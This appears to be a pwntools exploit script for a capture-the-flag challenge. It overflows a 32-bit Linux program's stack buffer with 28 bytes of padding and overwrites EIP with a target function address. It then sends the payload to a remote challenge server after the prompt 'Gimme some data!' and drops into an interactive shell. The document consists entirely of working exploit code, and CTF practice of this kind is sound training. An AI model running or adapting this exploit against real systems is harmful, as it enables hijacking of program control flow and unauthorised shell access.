from pwn import *

# Set up pwntools context
context(arch='i386', os='linux', endian='little')

# Address of the target function
target_address = 0x080491f5

# Offset to EIP
offset_to_eip = 28  # Determined from previous analysis

# Construct the payload
payload = b'A' * offset_to_eip
payload += p32(target_address)  # Pack the address in little-endian format

# Connect to the remote server
io = remote('challenge.ctf.games', 32338)

# Receive until the prompt "Gimme some data!"
io.recvuntil(b'Gimme some data!\n')

# Send the payload
io.sendline(payload)

# Interact with the shell
io.interactive()

